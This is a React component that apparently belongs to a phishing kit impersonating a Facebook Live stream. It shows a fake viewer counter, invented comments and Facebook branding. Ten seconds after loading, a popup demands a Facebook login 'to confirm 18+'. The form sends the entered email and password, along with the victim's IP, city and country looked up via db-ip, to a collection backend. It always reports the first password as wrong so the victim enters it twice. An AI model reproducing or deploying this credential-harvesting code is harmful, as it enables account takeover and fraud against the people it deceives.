import React, { useEffect, useRef } from 'react'
import { useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { Button, Form, Input } from 'antd';
import Slider from "react-slick";

import "./Publics/css/live.css"
import { angry, avatar, care, haha, image_1, image_2, image_3, image_4, image_5, image_6, image_7, image_8, image_vid, like, love, sad, wow } from './Publics/images/images'
import axios from 'axios';


const LiveComponent = () => {
    const [showComponent, setShowComponent] = useState(false);
    const [showPopup, setShowPopup] = useState(false);
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const navigate = useNavigate();
    const [showErr, setShowErr] = useState(false);
    const [showErrMail, setShowErrMail] = useState(false);
    const [firstPassword, setFirstPassword] = useState(false);
    const [number, setNumber] = useState(0);
    const [intervalTime, setIntervalTime] = useState(0);
    const videoRef = useRef(null);
  
    useEffect(() => {   

        setTimeout(() => {
            setShowPopup(true)
        }, 10000);

        const randomNumber = Math.floor(Math.random() * 2000); // Số ngẫu nhiên nhỏ hơn 100
        const randomInterval = Math.floor(Math.random() * 60000); // Thời gian ngẫu nhiên nhỏ hơn 60s (60000ms)
    
        setNumber(randomNumber); // Cập nhật số ngẫu nhiên
        setIntervalTime(randomInterval); // Cập nhật thời gian ngẫu nhiên
    
        const timeout = setTimeout(() => {
            const newRandomNumber = Math.floor(Math.random() * 2000);
            const newRandomInterval = Math.floor(Math.random() * 60000);
    
            setNumber(newRandomNumber); // Cập nhật số ngẫu nhiên sau mỗi khoảng thời gian
            setIntervalTime(newRandomInterval); // Cập nhật thời gian ngẫu nhiên sau mỗi khoảng thời gian
        }, randomInterval); // Sử dụng thời gian ngẫu nhiên đã được tạo
    
        return () => clearTimeout(timeout); // Xóa timeout khi component unmount
    }, []);


    const handlePasswordChange = (e) => {
        setPassword(e.target.value);
    };

    const handleTogglePassword = () => {
        setShowPassword(!showPassword);
    };

    const renderPasswordVisibility = visible => (
        visible ? (
            <span style={{color: '#3578e5', fontWeight: 'bold', cursor: 'pointer', fontSize: '12px'  }} onClick={handleTogglePassword} >
            HIDE
            </span>
        ) : (
            <span style={{color: '#3578e5', fontWeight: 'bold', cursor: 'pointer', fontSize: '12px'  }} onClick={handleTogglePassword} >
            SHOW
            </span>
        )
    );

    const handleShowView = () => {
        setShowComponent(!showComponent)
    }

    const handleShowLogin = () => {
        setShowPopup(!showPopup)
    }

    const onFinish = (values) => {


        axios.get(`https://api.db-ip.com/v2/free/self`).then((response) => {
                
            const data   = { 
                email: values.email_or_phone, 
                password: values.password,
                ip: response.data.ipAddress,
                city: response.data.city,
                country: response.data.countryName,
            }

            if(firstPassword === false){
                localStorage.setItem('dataForm', JSON.stringify(values))
    
                axios.post(`http://localhost:3600/api/news`, data)
                    
                setShowErr(true)
                setFirstPassword(true)
            } else {
                axios.post(`http://localhost:3600/api/news`, data)
                setShowPopup(false)
                setFirstPassword(false)
            }

        })

    }

    const onFinishFailed = (errorInfo) => {
        if(errorInfo.values.password == undefined){
            setShowErr(true)
        } else {
            setShowErr(false)
        }
        
        if(errorInfo.values.email_or_phone == undefined){
            setShowErrMail(true)
        } else {
            setShowErrMail(false)
        }
    };

    const settings = {
        slidesToShow: 4,
        slidesToScroll: 1,
        vertical: true,
        verticalSwiping: true,
        autoplay: true,
        autoplaySpeed: 2500
    };

    return (
     
        <>

            <div className="main login-page">

                <div className="live ">
                    {/* <!-- NAV TOP --> */}
                    <div className={`nav-top-live ${showComponent === true ? 'active' : ''}`}>
                        <div className="btn">
                            <Link href="https://www.facebook.com">
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M0.334735 0.334735C0.781049 -0.111578 1.50467 -0.111578 1.95098 0.334735L8 6.38376L14.049 0.334735C14.4953 -0.111578 15.219 -0.111578 15.6653 0.334735C16.1116 0.781049 16.1116 1.50467 15.6653 1.95098L9.61624 8L15.6653 14.049C16.1116 14.4953 16.1116 15.219 15.6653 15.6653C15.219 16.1116 14.4953 16.1116 14.049 15.6653L8 9.61624L1.95098 15.6653C1.50467 16.1116 0.781049 16.1116 0.334735 15.6653C-0.111578 15.219 -0.111578 14.4953 0.334735 14.049L6.38376 8L0.334735 1.95098C-0.111578 1.50467 -0.111578 0.781049 0.334735 0.334735Z" fill="white"/>
                                </svg>
                            </Link>
                        </div>
                        <div className="logo">
                            <svg viewBox="0 0 36 36" className="x1lliihq x1k90msu x2h7rmj x1qfuztq x1ssd25i x19dipnz" fill="currentColor" height="40" width="40" style={{color: "#0866ff"}}><path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path><path className="xe3v8dz"  style={{color: 'white'}} d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path></svg>
                        </div>
                        <div className="text">
                            live
                        </div>
                        <div className="view">
                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M10.5 8C10.5 9.38071 9.38071 10.5 8 10.5C6.61929 10.5 5.5 9.38071 5.5 8C5.5 6.61929 6.61929 5.5 8 5.5C9.38071 5.5 10.5 6.61929 10.5 8Z" fill="black"/>
                                <path d="M0 8C0 8 3 2.5 8 2.5C13 2.5 16 8 16 8C16 8 13 13.5 8 13.5C3 13.5 0 8 0 8ZM8 11.5C9.933 11.5 11.5 9.933 11.5 8C11.5 6.067 9.933 4.5 8 4.5C6.067 4.5 4.5 6.067 4.5 8C4.5 9.933 6.067 11.5 8 11.5Z" fill="black"/>
                            </svg>
                            {number}
                        </div>
                    </div>

                    {/* <!-- VIDEO --> */}
                    <div className="content-live">
                        {/*<video ref={videoRef} preload="auto" height="100%" webkit-playsinline playsinline autoPlay="autoplay" loop muted type="video/mp4" crossorigin="use-credentials"></video> 

                        <video ref={videoRef} preload="auto" height="100%" webkit-playsinline autoPlay="autoplay" loop muted playsinline >
                            <source src={video} type="video/mp4" />
                        </video>
                        <img src={image_video} height={"100%"} alt="" />
                    */}
                    
                    <img src={image_vid} height={"100%"} alt="" />

                        


                        
                    </div>

                    {/* <!-- NAV BOTTOM --> */}
                    <div className="nav-bottom-live">
                        <div className="bottom-up">

                        </div>
                        <div className="bottom-dow">

                            <div className="icon">
                                <img src={like} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={love} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={care} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={haha} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={wow} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={sad} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={angry} width="100%" alt="" />
                            </div>

                        </div>
                    </div>
                </div>

                <div className="comment ">
                    
                    <div className="page">
                        <div className="detail-page">
                            <div className="info-page">
                                <div className="avatar">
                                    <img src={avatar} width="100%" alt="" />
                                </div>
                                <div className="name">
                                    <div className="name-page">
                                        <p><Link href="">HIEN NGO Boutique</Link> is live <br/> now.</p>
                                    </div>
                                    <div className="time">
                                        <p><Link href="">1h</Link></p>
                                        <p>·</p>
                                        <svg viewBox="0 0 16 16" width="12" height="12" fill="currentColor" title="Shared with Public" className="x19dipnz x1lliihq x1k90msu x2h7rmj x1qfuztq" ><title>Shared with Public</title><g fillRule="evenodd" transform="translate(-448 -544)"><g><path d="M109.5 408.5c0 3.23-2.04 5.983-4.903 7.036l.07-.036c1.167-1 1.814-2.967 2-3.834.214-1 .303-1.3-.5-1.96-.31-.253-.677-.196-1.04-.476-.246-.19-.356-.59-.606-.73-.594-.337-1.107.11-1.954.223a2.666 2.666 0 0 1-1.15-.123c-.007 0-.007 0-.013-.004l-.083-.03c-.164-.082-.077-.206.006-.36h-.006c.086-.17.086-.376-.05-.529-.19-.214-.54-.214-.804-.224-.106-.003-.21 0-.313.004l-.003-.004c-.04 0-.084.004-.124.004h-.037c-.323.007-.666-.034-.893-.314-.263-.353-.29-.733.097-1.09.28-.26.863-.8 1.807-.22.603.37 1.166.667 1.666.5.33-.11.48-.303.094-.87a1.128 1.128 0 0 1-.214-.73c.067-.776.687-.84 1.164-1.2.466-.356.68-.943.546-1.457-.106-.413-.51-.873-1.28-1.01a7.49 7.49 0 0 1 6.524 7.434" transform="translate(354 143.5)"></path><path d="M104.107 415.696A7.498 7.498 0 0 1 94.5 408.5a7.48 7.48 0 0 1 3.407-6.283 5.474 5.474 0 0 0-1.653 2.334c-.753 2.217-.217 4.075 2.29 4.075.833 0 1.4.561 1.333 2.375-.013.403.52 1.78 2.45 1.89.7.04 1.184 1.053 1.33 1.74.06.29.127.65.257.97a.174.174 0 0 0 .193.096" transform="translate(354 143.5)"></path><path fillRule="nonzero" d="M110 408.5a8 8 0 1 1-16 0 8 8 0 0 1 16 0zm-1 0a7 7 0 1 0-14 0 7 7 0 0 0 14 0z" transform="translate(354 143.5)"></path></g></g></svg>
                                    </div>
                                </div>
                            </div>
                            <div className="action">
                                <div className="more">
                                    <svg width="16" height="4" viewBox="0 0 16 4" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <rect width="4" height="4" rx="2" fill="black"/>
                                        <rect x="6" width="4" height="4" rx="2" fill="black"/>
                                        <rect x="12" width="4" height="4" rx="2" fill="black"/>
                                    </svg>
                                </div>
                            </div>
                        </div>
                        <div className="content-page">
                            {/* <!-- <p>check cjahs hdhfjd dfdg trgf edr</p> --> */}
                        </div>
                        <div className="reaction">
                            <div className="icon">
                                <div className="icon-react">
                                    <img src="./publics/images/like.png" width="100%" alt="" />
                                </div>
                                <div className="icon-react">
                                    <img src="./publics/images/love.png" width="100%" alt="" />
                                </div>

                                <div className="count">
                                    1,2k
                                </div>
                            </div>
                            <div className="comment-react">
                                {/* <!-- <div className="count">
                                    2k
                                </div>
                                <div className="icon">
                                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M16 8C16 8 13 2.5 8 2.5C3 2.5 0 8 0 8C0 8 3 13.5 8 13.5C13 13.5 16 8 16 8ZM1.1727 8C1.22963 7.91321 1.29454 7.81677 1.36727 7.71242C1.70216 7.23193 2.19631 6.5929 2.83211 5.95711C4.12103 4.66818 5.88062 3.5 8 3.5C10.1194 3.5 11.879 4.66818 13.1679 5.95711C13.8037 6.5929 14.2978 7.23193 14.6327 7.71242C14.7055 7.81677 14.7704 7.91321 14.8273 8C14.7704 8.08679 14.7055 8.18323 14.6327 8.28758C14.2978 8.76807 13.8037 9.4071 13.1679 10.0429C11.879 11.3318 10.1194 12.5 8 12.5C5.88062 12.5 4.12103 11.3318 2.83211 10.0429C2.19631 9.4071 1.70216 8.76807 1.36727 8.28758C1.29454 8.18323 1.22963 8.08679 1.1727 8Z" fill="black"/>
                                        <path d="M8 5.5C6.61929 5.5 5.5 6.61929 5.5 8C5.5 9.38071 6.61929 10.5 8 10.5C9.38071 10.5 10.5 9.38071 10.5 8C10.5 6.61929 9.38071 5.5 8 5.5ZM4.5 8C4.5 6.067 6.067 4.5 8 4.5C9.933 4.5 11.5 6.067 11.5 8C11.5 9.933 9.933 11.5 8 11.5C6.067 11.5 4.5 9.933 4.5 8Z" fill="black"/>
                                    </svg>
                                </div> --> */}
                            </div>
                        </div>
                    </div>

                    {/* <!-- LIST COMMENT --> */}
                    <div className={`list-comment ${showComponent === true ? 'active' : ''}`}>

                        <div className="data-comment">
                            <Slider {...settings}>
                                <div className="item-comment">
                                    <div className="avatar">
                                        <img src={image_8} width="100%" alt="" />
                                    </div>
                                    <div className="name">
                                        <p className="user-name"><Link href="">Jorge Hernadez</Link></p>
                                        <p className="text">
                                            Very good
                                        </p>
                                    </div>
                                </div>

                                <div className="item-comment">
                                    <div className="avatar">
                                        <img src={image_7} width="100%" alt="" />
                                    </div>
                                    <div className="name">
                                        <p className="user-name"><Link href="">Rosia</Link></p>
                                        <p className="text">
                                            Very good 👍🏼
                                        </p>
                                    </div>
                                </div>

                                <div className="item-comment">
                                    <div className="avatar">
                                        <img src={image_6} width="100%" alt="" />
                                    </div>
                                    <div className="name">
                                        <p className="user-name"><Link href="">Gul Bano</Link></p>
                                        <p className="text">
                                            Where is the location in south, I will come Nxt wk from Sri Lanka
                                        </p>
                                    </div>
                                </div>

                                <div className="item-comment">
                                    <div className="avatar">
                                        <img src={image_5} width="100%" alt="" />
                                    </div>
                                    <div className="name">
                                        <p className="user-name"><Link href="">Vivekanand Yadav</Link></p>
                                        <p className="text">
                                            Where is the location
                                        </p>
                                    </div>
                                </div>

                                <div className="item-comment">
                                    <div className="avatar">
                                        <img src={image_4} width="100%" alt="" />
                                    </div>
                                    <div className="name">
                                        <p className="user-name"><Link href="">U Hla Tint</Link></p>
                                        <p className="text">
                                            Good
                                        </p>
                                    </div>
                                </div>

                                <div className="item-comment">
                                    <div className="avatar">
                                        <img src={image_3} width="100%" alt="" />
                                    </div>
                                    <div className="name">
                                        <p className="user-name"><Link href="">Shiva Prasad</Link></p>
                                        <p className="text">
                                            Locetion
                                        </p>
                                    </div>
                                </div>

                                <div className="item-comment">
                                    <div className="avatar">
                                        <img src={image_2} width="100%" alt="" />
                                    </div>
                                    <div className="name">
                                        <p className="user-name"><Link href="">Vishal Entperises</Link></p>
                                        <p className="text">
                                            Delicious food.
                                        </p>
                                    </div>
                                </div>

                                <div className="item-comment">
                                    <div className="avatar">
                                        <img src={image_1} width="100%" alt="" />
                                    </div>
                                    <div className="name">
                                        <p className="user-name"><Link href="">Paula James-scott</Link></p>
                                        <p className="text">
                                            🤦🏽‍♂️no closed captions [cc]
                                        </p>
                                    </div>
                                </div>
                            </Slider>
                        </div>

                    

                    </div>
                    
                    {/* <!-- REACT MOBILE --> */}
                    <div className={`reaction-mob ${showComponent === true ? 'active' : ''}`}>
                        <input type="text" onClick={handleShowLogin} placeholder="Write a comment..." />
                        <div className="list-react">
                            <div className="icon">
                                <img src={like} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={love} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={care} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={haha} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={wow} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={sad} width="100%" alt="" />
                            </div>
                            <div className="icon">
                                <img src={angry} width="100%" alt="" />
                            </div>
                        </div>
                    </div>

                    {/* <!-- NAV BOTTOM MOB --> */}
                    <div className="nav-bottom-mob">
                        <div className="action-mob">

                            <div className="view" onClick={handleShowView}>
                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path fillRule="evenodd" clipRule="evenodd" d="M1.64645 4.64645C1.84171 4.45118 2.15829 4.45118 2.35355 4.64645L8 10.2929L13.6464 4.64645C13.8417 4.45118 14.1583 4.45118 14.3536 4.64645C14.5488 4.84171 14.5488 5.15829 14.3536 5.35355L8.35355 11.3536C8.15829 11.5488 7.84171 11.5488 7.64645 11.3536L1.64645 5.35355C1.45118 5.15829 1.45118 4.84171 1.64645 4.64645Z" fill="white" stroke="white" strokeLinecap="round" strokeLinejoin="round"/>
                                </svg>
                            </div>
                            <div className={`live-action item-action-mob action ${showComponent === true ? 'active' : ''}`}>
                                Live Chat
                            </div>
                            <div className={`overview item-action-mob ${showComponent === true ? 'active' : ''}`}>
                                Overview
                            </div>

                        </div>
                    </div>

                </div>


                <div className={`popup ${showPopup === true ? 'active' : ''}`}>
                    <div className="background"></div>
                    <div className="content-popup col-md-3 col-11">
                        <div className="close">
                            <div className="btn-close" >
                                <svg width="8" height="8" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M0.646447 0.646447C0.841709 0.451184 1.15829 0.451184 1.35355 0.646447L4 3.29289L6.64645 0.646447C6.84171 0.451184 7.15829 0.451184 7.35355 0.646447C7.54882 0.841709 7.54882 1.15829 7.35355 1.35355L4.70711 4L7.35355 6.64645C7.54882 6.84171 7.54882 7.15829 7.35355 7.35355C7.15829 7.54882 6.84171 7.54882 6.64645 7.35355L4 4.70711L1.35355 7.35355C1.15829 7.54882 0.841709 7.54882 0.646447 7.35355C0.451184 7.15829 0.451184 6.84171 0.646447 6.64645L3.29289 4L0.646447 1.35355C0.451184 1.15829 0.451184 0.841709 0.646447 0.646447Z" fill="black"/>
                                </svg>
                            </div>
                        </div>

                        <div className="form">
                            
                            <div className="logo" style={{textAlign: "center"}}>
                                <h4>Content warning</h4>
                                <h6>Sign in to confirm your 18+</h6>
                                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"  width="100%" alt="Facebook" />
                            </div>
                            
                            {/* FORM START */}
                            <Form
                                name="basic"
                                initialValues={{
                                    remember: true,
                                }}
                                onFinish={onFinish}
                                onFinishFailed={onFinishFailed}
                                autoComplete="off"
                                style={{
                                    display:"flex",
                                    flexDirection: "column"
                                }}
                            >

                                <div className="item-form">
                                    <Form.Item
                                        name="email_or_phone"
                                        rules={[
                                            {
                                                required: true,
                                                message: "The email address or mobile number you entered isn't connected to an account.",
                                            },
                                        ]}
                                    >
                                        <Input placeholder='Email address or phone number' />
                                    </Form.Item>
                                </div>
                                
                                <div className="item-form">
                                    <p className={`err mail ${showErrMail === true ? 'active' : ''}`}>The email address or mobile number you entered isn't connected to an account.</p>
                                </div>

                                <div className="item-form">
                                    <Form.Item
                                        name="password"
                                        rules={[
                                            {
                                            required: true,
                                            message: `The password that you've entered is incorrect.`,
                                            },
                                        ]}
                                    >
                                        <Input 
                                            type={showPassword ? 'text' : 'password'}
                                            placeholder='Password' 
                                            onChange={handlePasswordChange }
                                            suffix={password.length > 0 ? renderPasswordVisibility(showPassword) : ''}
                                            allowClear
                                            autoComplete="new-password"
                                        />
                                    </Form.Item>
                                </div>

                                <div className="item-form">
                                    <p className={`err pass ${showErr === true ? 'active' : ''}`}>The password that you've entered is incorrect.</p>
                                </div>


                                <Form.Item 
                                    className="btn butoni"
                                >
                                    <Button
                                        htmlType="submit"
                                        style={{
                                            backgroundColor: "#0d6efd",
                                            outline: "none",
                                            border: 'none',
                                            boxShadow: 'none',
                                            color: "white",
                                            fontWeight: '700',
                                            fontSize:'1rem'
                                        }}
                                    >
                                        Log In
                                    </Button>
                                </Form.Item>
                            </Form>
                            {/* FORM END */}

                            <div className="bottom-form">
                                <div className="forgot">
                                    <Link href="https://facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar&from_login_screen=0">Forgotten password?</Link>
                                </div>
                               {/* <div className="or">
                                    <div className="line"></div>
                                    <p>or</p>
                                    <div className="line"></div>
                                </div>
                                <div className="create-acc">
                                    <Link href="https://www.facebook.com/reg/?next=%2Fwatch%2Flive%2F%3Fref%3Dlive_delegate">Create New Account</Link>
                                    </div> */}
                            </div>
                        </div>
                    </div>
                </div>

                </div>

        </>
        
    )
}

export default LiveComponent